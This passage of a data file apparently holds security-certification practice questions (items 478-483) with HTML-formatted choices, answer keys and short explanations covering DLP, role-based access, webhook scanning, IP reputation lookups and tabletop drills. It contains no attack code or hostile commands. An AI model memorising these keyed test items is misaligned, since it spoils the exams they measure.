font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Deny all traffic on port 8080 with sensitive information on the VLAN.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Develop a Python script to review email traffic for PII.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Employ a restrictive policy for the use and distribution of sensitive information.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Implement a DLP for all egress and ingress of sensitive information on the network.</li></ul></div><!--EndFragment-->","correct":"D","explanation":"DLP (Data Loss Prevention) is specifically designed to detect and prevent sensitive data from being improperly transmitted or leaked.\n\n🧠 Think: Sensitive data protection → DLP."},{"number":479,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A company wants to grant access to identity administrators who are completing similar tasks. Which of the following access control models should the company use?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Mandatory access</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Role-based access</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Attribute-based access</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Discretionary access</li></ul></div><!--EndFragment-->","correct":"B","explanation":"RBAC grants permissions based on a user's job role, so identity administrators performing similar tasks can receive the same access.\n\n🧠 Think: Same role → same permissions → RBAC.\n\nRBAC grants permissions by job role, so \nidentity administrators with similar responsibilities receive consistent access without assigning permissions individually."},{"number":480,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A DevOps analyst implements a webhook to trigger code vulnerability scanning for submissions to the repository. Which of the following is the primary benefit of this enhancement?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>To increase coverage by making the process occur automatically with uploads</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>To create a single pane of glass dashboard for the vulnerability management process</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>To include a threat feed component into the software development life cycle</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>To employ data enrichment for new code commits to enhance project documentation</li></ul></div><!--EndFragment-->","correct":"A","explanation":"A webhook automatically triggers the vulnerability scan whenever code is submitted, so scans happen consistently without manual intervention.\n\n🧠 Think: Webhook → automatic trigger → better coverage.\n\nA webhook improves vulnerability management by ensuring scans run consistently on every submission, which \nreduces the chance that unscanned code reaches later stages of the development process."},{"number":481,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst is looking for information that would serve as an indicator that a given IP address is Involved in other attacks. Which of the following sources of information should the analyst use to achieve this objective?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>AbuseIPDB</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Autonomous System Number</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Whois</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Cuckoo Sandbox</li></ul></div><!--EndFragment-->","correct":"A","explanation":"AbuseIPDB provides reputation information about IP addresses, including reports of malicious activity and previous attacks.\n\n🧠 Think: IP reputation → AbuseIPDB.\n\nAbuseIPDB is the best source for prior malicious activity because it aggregates community reports, while \nWHOIS identifies ownership and registration details rather than attack history."},{"number":482,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst is assessing the security of a cloud environment. The following output is generated when the assessment runs:<br><br><br>Authentication error -<br>Instance not found on preset location<br><br>Which of the following should the analyst use to fix the issue?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>run module_name and exec<module_name></module_name></li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>--session&nbsp;<session_name>and --module-args=\"<arg1>\"</arg1></session_name></li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>set_regions&nbsp;<region1>and set_key</region1></li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>--whoami and --data</li></ul></div><!--EndFragment-->","correct":"C","explanation":"The error indicates the tool can't authenticate or can't find the instance in the correct cloud region.\n\n🧠 Think:\nAuthentication → set_key\nWrong/missing region → set_regions"},{"number":483,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">An organization's Chief Information Security Officer (CISO) is organizing a tabletop drill. The CISO has included several other executives in the meeting invitation for the drill, as required. Which of the following is the best reason for including the Chief Communications Officer?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Deciding when and how to issue press releases regarding incidents can minimize damage to the organization's brand reputation.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>All of the organization's high-level executives should know about the IT department's incident response plan.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>All parties must be able to communicate clearly. concisely, and consistently during incident response.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>The CISO would like to increase the security department's visibility to senior executives.</li></ul></div><!--EndFragment-->","correct":"A","explanation":"The Chief Communications Officer handles external communications, including press releases and public statements, which can protect the organization's reputation during an incident.\n\n🧠 Think: CCO → Communications → Public/reputation.\n\nThe Chief Communications Officer’s role is most di
